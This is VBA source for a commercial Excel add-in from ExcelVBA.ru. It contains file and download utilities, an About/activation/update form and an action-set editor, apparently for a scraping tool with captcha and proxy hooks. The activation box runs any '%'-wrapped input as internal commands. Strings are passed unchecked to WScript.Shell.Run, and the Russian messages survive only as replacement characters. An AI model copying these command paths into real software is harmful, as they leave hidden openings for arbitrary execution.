Function DownLoadFileFromURL(ByVal URL$, ByVal LocalPath$, Optional ByVal DisableCache As Boolean = False) As Boolean
    On Error Resume Next: Dim shortFilename$
    If (LocalPath$ = "") Or (URL$ = "") Then Exit Function
    If Not LocalPath$ Like "*\*" Then LocalPath$ = Environ("TEMP") & "\" & LocalPath$
    Kill LocalPath$
    shortFilename$ = Mid(LocalPath$, InStrRev(LocalPath$, "\") + 1)
    If shortFilename$ <> Replace_symbols(shortFilename$) Then
        Debug.Print "Wrong symbols in filename: " & shortFilename$
        Exit Function
    End If
    If DisableCache Then Randomize: URL$ = URL$ & "?HID=" & HID & "&rnd=" & Left(Rnd(Now) * 1E+15, 10)
    DownLoadFileFromURL = URLDownloadToFile(0, URL$, LocalPath$, 0, 0) = 0
End Function

Function GetFileExtension(ByVal FileName$) As String
    On Error Resume Next: FileName$ = Replace(FileName$, "/", "\")
    FileName$ = Split(FileName$, "\")(UBound(Split(FileName$, "\")))
    If FileName$ Like "*.*" Then GetFileExtension = Split(FileName$, ".")(UBound(Split(FileName$, ".")))
End Function


Function GetFolderPath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFolderDialogCaption")
    Dim PS$: PS = Application.PathSeparator
    With Application.FileDialog(msoFileDialogFolderPicker)
        If Not Right$(InitialPath, 1) = PS Then InitialPath = InitialPath & PS
        .ButtonName = tt("SelectButtonCaption")
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        GetFolderPath = .SelectedItems(1)
        If Not Right$(GetFolderPath, 1) = PS Then GetFolderPath = GetFolderPath & PS
    End With
End Function

Function GetFilePath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\", _
                     Optional ByVal FilterDescription$ = "Excel files", Optional ByVal FilterExtension$ = "*.xls*") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFileDialogCaption")
    With Application.FileDialog(msoFileDialogOpen)
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        .Filters.Clear: .Filters.Add FilterDescription, FilterExtension
        If .Show <> -1 Then Exit Function
        GetFilePath = .SelectedItems(1)
    End With
End Function

Function GetFilenamesCollection(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As FileDialogSelectedItems
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFilesDialogCaption")
    With Application.FileDialog(3)        ' msoFileDialogFilePicker
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        Set GetFilenamesCollection = .SelectedItems
    End With
End Function

Function FilenamesCollection(ByVal FolderPath$, Optional ByVal Mask$ = "*", Optional ByVal SearchDeep& = 999) As Collection
    On Error Resume Next: Dim FSO As Object: Set FilenamesCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    GetAllFileNamesUsingFSO FolderPath, Mask, FSO, FilenamesCollection, SearchDeep
    Set FSO = Nothing        ': Application.StatusBar = False
End Function

Function GetAllFileNamesUsingFSO(ByVal FolderPath$, ByVal Mask$, ByRef FSO, ByRef FileNamesColl As Collection, ByVal SearchDeep&)
    On Error Resume Next: Dim oCurrFolder As Object, oFile As Object, oSubFolder As Object
    Const ExcludeFiles$ = "Thumbs.db, desktop.ini"

    Set oCurrFolder = FSO.GetFolder(FolderPath)
    If Not oCurrFolder Is Nothing Then
        ' Application.StatusBar = "Searching in: " & FolderPath$
        For Each oFile In oCurrFolder.files
            If oFile.Name Like "*" & Mask Then
                If InStr(1, ExcludeFiles$, oFile.Name, vbTextCompare) = 0 Then
                    If InStr(1, oFile.Name, "~$", vbTextCompare) <> 1 Then FileNamesColl.Add oFile.Path
                End If
            End If
        Next
        SearchDeep& = SearchDeep& - 1
        If SearchDeep& Then
            For Each oSubFolder In oCurrFolder.SubFolders
                GetAllFileNamesUsingFSO oSubFolder.Path, Mask, FSO, FileNamesColl, SearchDeep&
            Next
        End If
        Set oFile = Nothing: Set oSubFolder = Nothing: Set oCurrFolder = Nothing
    End If
End Function

Function SubFoldersCollection(ByVal FolderPath$, Optional ByVal Mask$ = "*") As Collection
    On Error Resume Next: Dim FSO As Object, oSubFolder As Object

    Set SubFoldersCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    If Right(FolderPath$, 1) <> "\" Then FolderPath$ = FolderPath$ & "\"

    For Each oSubFolder In FSO.GetFolder(FolderPath$).SubFolders
        If oSubFolder.Path Like FolderPath$ & Mask$ Then SubFoldersCollection.Add oSubFolder.Path & "\"
    Next oSubFolder
    Set oSubFolder = Nothing: Set FSO = Nothing
End Function


Function ReadTXTfile(ByVal FileName$) As String
    On Error Resume Next: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(FileName$, 1, True): ReadTXTfile = ts.ReadAll: ts.Close
    Set ts = Nothing: Set FSO = Nothing
End Function

Function SaveTXTfile(ByVal FileName$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(FileName$, True)
    ts.Write txt: ts.Close
    SaveTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function

Function AddIntoTXTfile(ByVal FileName$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(FileName$, 8, True): ts.Write txt: ts.Close
    AddIntoTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function


Function Replace_symbols(ByVal txt$, Optional ReplaceWith$ = "_", Optional ByVal AllowPathSeparator As Boolean = False) As String
    On Error Resume Next: Dim i&, CharsList$: CharsList$ = "/\:?*|""<>"
    If AllowPathSeparator Then CharsList$ = Replace(CharsList$, Application.PathSeparator, "")
    For i& = 1 To Len(CharsList$)
        txt$ = Replace(txt$, Mid(CharsList$, i&, 1), ReplaceWith$)
    Next
    Replace_symbols = txt$
End Function

Sub OpenFolder(ByVal FolderPath$)        ' to open FolderPath$ in Windows Explorer
    On Error Resume Next: If FolderPath$ = "" Then Exit Sub
    If FolderExists(FolderPath$) Then
        FollowHyperlink "explorer.exe /e, """ & FolderPath$ & """"
    Else
        MsgBox tt("UnableToOpenFolder", vbNewLine & FolderPath$ & vbNewLine), vbExclamation, tt("FolderNotFound")
    End If
End Sub

Sub FollowHyperlink(ByVal URL$)
    On Error Resume Next
    If Len(URL$) Then
        URL$ = Replace(URL$, "%website%", DEVELOPER_WEBSITE$)
        URL$ = Replace(URL$, "%projectname%", PROJECT_NAME$)
        URL$ = Replace(URL$, "%hid%", HID)
        CreateObject("WScript.Shell").Run URL$
    End If
End Sub

Sub ShowFile(ByVal FilePath$)        ' to open FilePath$ in Windows Explorer
    On Error Resume Next: If FilePath$ = "" Then Exit Sub
    FollowHyperlink "explorer.exe /e,/select,""" & FilePath$ & """"
End Sub

Sub ShowText(ByVal txt$, Optional ByVal Index&)        ' to open text as a file in Notepad
    On Error Resume Next: Dim FileName$
    FileName$ = Environ("TEMP") & "\text" & IIf(Index, Index, Left(Rnd() * 1E+15, 10)) & ".txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(FileName, True)
        .Write txt$: .Close
    End With
    FollowHyperlink """" & FileName$ & """"
End Sub

Function ChangeFileCharset(ByVal FileName$, ByVal DestCharset$, Optional ByVal SourceCharset$) As Boolean
    On Error Resume Next: Err.Clear: Dim FileContent$
    With CreateObject("ADODB.Stream")
        .Type = 2: If Len(SourceCharset$) Then .Charset = SourceCharset$
        .Open: .LoadFromFile FileName$
        FileContent$ = .ReadText: .Close
        .Charset = DestCharset$: .Open: .WriteText FileContent$
        .SaveToFile FileName$, 2: .Close
    End With
    ChangeFileCharset = Err = 0: Err.Clear
End Function

Function temp_folder$()
    On Error Resume Next: temp_folder$ = Environ("TEMP") & "\ExcelTemporaryFiles\"
    If Dir(temp_folder$, vbDirectory) = "" Then MkDir temp_folder$
End Function

Function temp_filename$()
    On Error Resume Next: Dim iter&, txt$
get_rnd:     iter& = iter& + 1: txt$ = Left(Rnd(Now) * 1E+15, 10)
    temp_filename$ = temp_folder$ & "temp_file_" & Format(Now, "YYYY-MM-DD--HH-NN-SS") & "__" & txt$
    If Dir(temp_filename$, vbNormal) <> "" Then If iter& < 5 Then GoTo get_rnd
End Function

Function FolderExists(ByVal Folder$) As Boolean
    On Error Resume Next: FolderExists = CreateObject("Scripting.FileSystemObject").FolderExists(Folder$)
End Function

Function FileExists(ByVal FileName$) As Boolean
    On Error Resume Next: FileExists = CreateObject("Scripting.FileSystemObject").FileExists(FileName$)
End Function

Function URL_Encode(ByVal txt As String) As String
    On Error Resume Next: Dim i&, l$, t$
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 4095: t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "%20"
            Case Else: t = l
        End Select
        URL_Encode = URL_Encode & t
    Next
End Function

Function FileOrFolderSize(ByVal s) As String
    On Error Resume Next: Dim Size As Single: Size = Fix(Val(s))
    Select Case Size
        Case Is < 1000: FileOrFolderSize = Size & " bytes"
        Case Is < 10000: FileOrFolderSize = FormatNumber(Size / 1024, 1) & " KB"
        Case Is < 1000000: FileOrFolderSize = FormatNumber(Size \ 1024, 0) & " KB"
        Case Is < 10000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 1) & " MB"
        Case Is < 1000000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 0) & " MB"
        Case Else: FileOrFolderSize = FormatNumber(Size / 1024 / 1024 / 1024, 1) & " GB"
    End Select
End Function

Attribute VB_Name = "F_About"
Attribute VB_Base = "0{96DD1C65-4B85-4AA2-B7E3-C57EED0E8C1C}{8C3CCFA3-DDF7-4039-B78C-6857ED496E1E}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_About                    Version: 20
' Author        : Igor Vakhnenko                   Date: 20.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Public StopEvents As Boolean
' Const HL_COLOR& = 16711680, HL_COLOR_ACTIVE& = 49152

Sub ComboBox_Language_Change()
    On Error Resume Next
    Set Me.Image_CurrentLanguage.Picture = Nothing
    Set Me.Image_CurrentLanguage.Picture = Me.Controls("Image_" & Me.ComboBox_Language).Picture
    Me.MultiPage1.SetFocus
    Me.HL_VersionsHistory.Enabled = Me.ComboBox_Language = "ru"
    Me.Label_HL_Cabinet.Enabled = Me.ComboBox_Language = "ru"

    If Me.ComboBox_Language = GetLanguage$ Then Exit Sub
    SetLanguage Me.ComboBox_Language
    CreateProgramCommandBar
    'TranslateUserForm Me
    UserForm_Initialize
End Sub

Private Sub CommandButton_InstallUpdate_Click()
    InstallUpdate
End Sub
Private Sub HL_VersionsHistory_Click()
    On Error Resume Next: FollowHyperlink VERSIONS_HISTORY_HYPERLINK$
End Sub

Private Sub Image_EF_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Me.MultiPage1.Pages("Page_RegInfo").Visible = True
End Sub

Private Sub Image_EF_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next
    If TrueDeveloper And (Button = 2) Then
        If Not Run(CFA_NAME$ & "Ready") Then MsgBox "CommonFunctions add-in is not available now", vbExclamation: Exit Sub
        Run CFA_NAME$ & "CreateAddInUpdate", PROJECT_NAME$, ThisWorkbook
        Unload Me
    End If
    If Button = 1 And Shift = 3 Then
        Dim small As Boolean: small = Me.Height < 300
        Me.Height = IIf(small, 308, 270): Me.MultiPage1.value = 0
    End If
End Sub

Private Sub Image_Main_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next: CreateProgramCommandBar
End Sub

Private Sub Label_HL_Cabinet_Click()
    On Error Resume Next
    If Not Request_("action=get_cabinet_url") Then FWF.FollowHyperlink CABINET_HYPERLINK$
End Sub

Sub UserForm_Initialize()
    On Error Resume Next: Me.StopEvents = True
    Me.TextBox_ProgramCodeName = PROJECT_NAME$: Me.Label_ProgramFullname = tt("ProgramFullname")
    Me.Caption = tt("MENU_ABOUT"): Me.TextBox_HID = HID$: Me.TextBox_HWID = HWID$
    Me.TextBox_email = SETT.GetRegValue("email")
    Me.Label_CurrVersionNumber1 = GetVersionTXT: Me.Label_CurrVersionNumber2 = GetVersionTXT
    Me.CheckBox_InstallUpdatesAutomatically.value = SETT.GetBoolean("AutoInstall", False, "Updates")
    Me.CheckBox_Autorun.value = AddinAutoRun

    Dim larr, i&, PROJECT_LASTYEAR&, BuiltDate As Date, picpath$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage

    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    If BuiltDate > 42200 Then Me.Label_CurrVersionDate = Format(BuiltDate, "D MMM YYYY  HH:NN") & "  GMT+6" Else Me.Label_CurrVersionDate.Visible = False

    Me.Label_Copyright = Replace(Me.Label_Copyright, "YYYY", ProgramYears)
    Me.Label_SendEmail = IIf(RUS, SUPPORT_EMAIL_RUS$, SUPPORT_EMAIL$)

    '    Me.Label_RegHyperlink.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        ' Replace(BUY_NEW_HYPERLINK$$, "&", "&&")
    '    Me.Label_HL_BuyLicense.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        'Replace(BUY_NEW_HYPERLINK$, "&", "&&")
    '    Me.Label_ProgramWebPage.ControlTipText = Split(PROGRAM_HYPERLINK$, "?")(0)

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)
    If SETT.IsFirstRun Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    TranslateUserForm Me
    Me.MultiPage1.value = 0: MultiPage1_Change
    Me.StopEvents = False
End Sub

Private Sub CheckBox_Autorun_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    AddinAutoRun Me.CheckBox_Autorun.value
End Sub

Private Sub CheckBox_InstallUpdatesAutomatically_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    SETT.SetText "AutoInstall", Me.CheckBox_InstallUpdatesAutomatically, "Updates"
End Sub

Private Sub CommandButton_ActivateProgram_Click()
    Dim msg$, res As Boolean, code$
    code$ = Trim(Me.TextBox_ActivationCode)

    If code$ Like "%*%" Then
        EXECUTE_COMMANDS Split(code$, "%")(1), True
    Else
        If code$ Like "LANGUAGE ??" Then ActivateLanguage Split(code$)(1): Exit Sub
        ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
        If code$ Like "SWITCHER #" Then SETT.SetText "SettingsSwitcher", Split(code$)(1), "Setup": CreateProgramCommandBar: Exit Sub
        
        If Not Request_("action=activation", "data=" & code$) Then
            MsgBox tt("FA_ACT_ConnectError"), vbCritical, PROJECT_NAME$
            Exit Sub
        End If
    End If
    'Me.MultiPage1.Value = 0
End Sub

Sub ActivateLanguage(ByVal lang$)
    On Error Resume Next: Dim larr, i&
    SetLanguage lang$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = lang$
End Sub

Private Sub CommandButton_Uninstall_Click()
    UninstallThisFile 1        ' with confirmation
End Sub

Private Sub Label_RegHyperlink_Click()
    On Error Resume Next: Dim hl$: hl$ = BUY_NEW_HYPERLINK$
    If Len(hl$) Then FollowHyperlink hl$
End Sub

Private Sub TextBox_ActivationCode_Change()
    Me.CommandButton_ActivateProgram.Enabled = Len(Trim(Me.TextBox_ActivationCode)) > 0
End Sub

Sub MultiPage1_Change()
    On Error Resume Next
    If SETT.RSP(1) = "" Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    Select Case Me.MultiPage1.Pages(Me.MultiPage1.value).Name
        Case "Page_About"
            UpdateStatus Me.Label_Info
        Case "Page_RegInfo"
        Case "Page_Updates"
            CheckForUpdates
        Case "Page_Options"
    End Select
End Sub
Private Sub CommandButton_Close_Click(): Unload Me: End Sub

Private Sub Label_HL_BuyLicense_Click()
    FollowHyperlink IIf(Me.MultiPage1.Pages("Page_RegInfo").Visible, BUY_NEW_HYPERLINK$, BUY_ADD_HYPERLINK$ & "&email=" & SETT.GetRegValue("email"))
End Sub
Private Sub Label_ProgramWebPage_Click()
    On Error Resume Next: FollowHyperlink PROGRAM_HYPERLINK$
End Sub
Private Sub Label_SendEmail_Click()
    On Error Resume Next: FollowHyperlink "mailto:" & Me.Label_SendEmail & "?subject=" & PROJECT_NAME$ & "%20Support"
End Sub

Sub CheckForUpdates()
    On Error Resume Next
    Dim LastUpdateCheckTime As Date, LastUpdateCheckComment$
    Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Search.Picture
    Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Searching")
    Me.CommandButton_InstallUpdate.Visible = False
    'Application.Wait Now + 1 / 86400

    LastUpdateCheckTime = CDate(SETT.GetText("LastCheck", 0, "Updates"))
    If Abs(LastUpdateCheckTime - CDbl(Now)) > 10 / 86400 Then
        Me.MultiPage1.Enabled = False
        If Not Request_("action=updates") Then
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Error.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_ConnectError")
            Me.MultiPage1.Enabled = True        ': SETT.SetText "LastCheck", Now, "Updates"
            Exit Sub
        End If
        Me.MultiPage1.Enabled = True
    End If

    LastUpdateCheckComment$ = SETT.GetText("LastCheckComment", "", "Updates")
    Select Case True
        Case LastUpdateCheckComment$ Like "Last version is installed*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Last.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_LastVersionInstalled")

        Case LastUpdateCheckComment$ Like "Updates not found"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_NotFound.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_NotFound", PROJECT_NAME$)

        Case LastUpdateCheckComment$ Like "New version found*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Found.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Found") & " (" & SETT.GetText("NewVersion", 0, "Updates") & ")"
            Me.CommandButton_InstallUpdate.Visible = True
    End Select
End Sub
Attribute VB_Name = "F_ActionSetEditor"
Attribute VB_Base = "0{0A928FCA-A869-4A3F-9B99-DF987B86C815}{64275ECF-7240-49E8-9FAB-E1215345CC50}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_ActionSetEditor                    Version:
' Author        : Igor Vakhnenko                   Date: 13.11.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text

Public AASets As ActionSets, SourceSheet As Worksheet, StopEvents As Boolean, ActiveActionSet As ActionSet, SpecialControlsCollection As Collection
Dim ValueOnStart As String

Sub Fill_ActionSets_Values()
    On Error Resume Next
    Me.StopEvents = True
    Me.ListBox_ActionSets.list = Me.AASets.ToArray(True)
    
    If Not Me.ActiveActionSet Is Nothing Then Me.ListBox_ActionSets.ListIndex = ActiveActionSet.Index - 1
    
    Me.CommandButton_DeleteActionSet.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    Me.CommandButton_ActionSet_Execute.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    Me.CommandButton_CloneActionSet.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    
    Me.StopEvents = False
End Sub

Sub Initialize()
    On Error Resume Next
    If SourceSheet Is Nothing Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical
        Unload Me
        Exit Sub
    End If
    Set Me.AASets = New ActionSets
    Me.AASets.ReadFromWorksheet SourceSheet
    Fill_ActionSets_Values
    ValueOnStart = Me.AASets.ExportToXML.XML
End Sub

Sub Initialize_2(ByRef AAs As ArrayActions)
    On Error Resume Next
    If SourceSheet Is Nothing Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical
        Unload Me
        Exit Sub
    End If
    Set Me.AASets = New ActionSets
    Me.AASets.ReadFromWorksheet SourceSheet
    
    With Me.AASets.Add
        .SetType = "system"
        .Name = "System_" & Val(Timer)
        .Actions.LoadFromXML AAs.ExportToXML        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| AAs
    End With
    
    Fill_ActionSets_Values
    ValueOnStart = Me.AASets.ExportToXML.XML
    
    Me.ListBox_ActionSets.ListIndex = Me.ListBox_ActionSets.ListCount - 1
End Sub

Private Sub CommandButton_ActionSet_Execute_Click()
    On Error Resume Next: Dim txt$
    Me.ActiveActionSet.Execute txt$
    AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b> " & IIf(Len(Me.ActiveActionSet.Name), "|fffd|" & Me.ActiveActionSet.Name & "|fffd|", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") & vbNewLine & _
        IIf(Len(txt), "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: </b>" & vbNewLine & FormatTextForBalloon(txt), "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), bt_Information
End Sub

Private Sub CommandButton_Cancel_Click()
    On Error Resume Next
    Unload Me
End Sub

Sub CommandButton_SaveActionSets_Click()
    On Error Resume Next
    Me.AASets.SaveToWorksheet Me.SourceSheet
    ValueOnStart = Me.AASets.ExportToXML.XML
End Sub

Private Sub CommandButton_SaveActionSetsAndClose_Click()
    On Error Resume Next
    CommandButton_SaveActionSets_Click
    Unload Me
End Sub

Private Sub ListBox_ActionSets_Change()
    On Error Resume Next
    If Me.StopEvents Then Exit Sub
    Set Me.ActiveActionSet = Nothing
    Set Me.ActiveActionSet = Me.AASets.GetItemByIndex(Me.ListBox_ActionSets.ListIndex + 1)
    Me.Frame_SelectedActionSet.Visible = Me.ListBox_ActionSets.ListIndex >= 0
    Me.Load_ActiveActionSet_Values
    
    Me.CommandButton_DeleteActionSet.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    Me.CommandButton_ActionSet_Execute.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    Me.CommandButton_CloneActionSet.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    
End Sub

Private Sub ListBox_ActionSets_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next
    If Me.ListBox_ActionSets.ListIndex >= 0 Then Me.ActiveActionSet.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveActionSet.Name & "|fffd|"
End Sub

Private Sub CommandButton_AddActionSet_Click()
    On Error Resume Next
    Dim ind&
    ind& = Me.AASets.Add.Index
    Fill_ActionSets_Values
    Me.ListBox_ActionSets.ListIndex = ind& - 1
    Me.ListBox_ActionSets.SetFocus
End Sub

Private Sub CommandButton_CloneActionSet_Click()
    On Error Resume Next
    With Me.ActiveActionSet.ParentSets
        With .Add
            .LoadFromXML ActiveActionSet.ExportToXML
        End With
        .UpdateIndexes
    End With
    Me.Fill_ActionSets_Values
    Me.ListBox_ActionSets.ListIndex = Me.ListBox_ActionSets.ListCount - 1
End Sub

Private Sub CommandButton_DeleteActionSet_Click()
    On Error Resume Next
    Me.AASets.DeleteItem Me.ActiveActionSet.Index
    Set Me.ActiveActionSet = Nothing
    Me.Fill_ActionSets_Values
    Me.ListBox_ActionSets.ListIndex = Me.ListBox_ActionSets.ListCount - 1
    Me.ListBox_ActionSets.SetFocus
    
    Set Me.ActiveActionSet = Me.AASets.GetItemByIndex(Me.ListBox_ActionSets.ListIndex + 1)
    Me.Frame_SelectedActionSet.Visible = Me.ListBox_ActionSets.ListIndex >= 0
    Me.Load_ActiveActionSet_Values
End Sub

Sub Load_ActiveActionSet_Values()
    On Error Resume Next
    If ActiveActionSet Is Nothing Then Exit Sub
    Me.Frame_SelectedActionSet.Visible = True
    
    With ActiveActionSet
        Me.TextBox_ActionSet_Name = .Name
        Me.TextBox_ActionSet_Type = .SetType
        Me.TextBox_ActionSet_Description = .Description
        StopEvents = True
        Me.ListBox_Actions_ActionSet.list = .Actions.ToArray
        StopEvents = False
    End With
End Sub

Private Sub TextBox_ActionSet_Name_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveActionSet.Name = Trim(Me.TextBox_ActionSet_Name)
    Me.TextBox_ActionSet_Name.BackColor = vbWindowBackground
    
    Select Case Me.ActiveActionSet.Name
        Case ACTION_SET_NAME_ONSTART$, ACTION_SET_NAME_BEFORESTART$, ACTION_SET_NAME_ONFINISH$
            Me.TextBox_ActionSet_Name.BackColor = &HFFC0FF
        Case ACTION_SET_NAME_BEFORE_SI$, ACTION_SET_NAME_AFTER_SI$, ACTION_SET_NAME_AFTER_LAST_LEVEL$
            Me.TextBox_ActionSet_Name.BackColor = vbYellow
        Case ACTION_SET_NAME_ONCAPTCHA$, ACTION_SET_NAME_MORE_PROXY$, ACTION_SET_NAME_ON_PROXY_CHANGED$
            Me.TextBox_ActionSet_Name.BackColor = vbGreen
    End Select
    Me.Fill_ActionSets_Values
End Sub

Private Sub CommandButton_EditActions_ActionSet_Click()
    On Error Resume Next
    Me.ActiveActionSet.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveActionSet.Name & "|fffd|"
End Sub

Private Sub Run_UpdateArrayActions_Change()
    On Error Resume Next
    Me.Load_ActiveActionSet_Values
    Me.Fill_ActionSets_Values
End Sub

Private Sub TextBox_ActionSet_Type_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveActionSet.SetType = Trim(Me.TextBox_ActionSet_Type)
    Me.Fill_ActionSets_Values
End Sub

Private Sub TextBox_ActionSet_Description_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveActionSet.Description = Trim(Me.TextBox_ActionSet_Description)
    Me.Fill_ActionSets_Values
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next: Dim msg$
    If ValueOnStart <> Me.AASets.ExportToXML.XML Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbQuestion + vbYesNoCancel + vbDefaultButton3, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
            Case vbYes
                CommandButton_SaveActionSets_Click
            Case vbNo
                
            Case vbCancel
                Cancel = True
                Exit Sub
        End Select
    End If
End Sub

Attribute VB_Name = "F_Balloon"
Attribute VB_Base = "0{4B569AF5-71F0-4DAF-BBAC-9BE595DB4D15}{83E87E08-FBA3-4A93-AABD-D406A45FC7F9}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
